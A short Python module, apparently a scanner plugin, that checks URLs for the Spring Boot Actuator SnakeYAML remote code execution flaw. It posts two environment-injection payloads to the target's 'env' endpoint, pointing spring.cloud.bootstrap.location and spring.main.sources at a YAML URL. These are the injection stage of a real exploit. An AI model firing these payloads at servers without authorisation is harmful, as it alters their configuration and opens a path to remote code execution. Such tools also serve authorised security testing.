import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        Headers_1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        Headers_2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
            "Content-Type": "application/json"
        }
        payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
        payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
        path = 'env'
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + path, cookies=s_cookie,headers=Headers_1,data=payload_1,proxies=proxies, verify=False, timeout=5)
        aa2 = requests.post(url1 + path, cookies=s_cookie,headers=Headers_2,data=payload_2,proxies=proxies, verify=False, timeout=5)
        if ('example.yml' in str(aa1.text)):
            cdd='[+]SnakeYAML_RCE-1\n'+str(aa1.text)
        elif ('example.yml' in str(aa2.text)):
            cdd='[+]SnakeYAML_RCE-2\n'+str(aa2.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring SnakeYAML-RCE ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)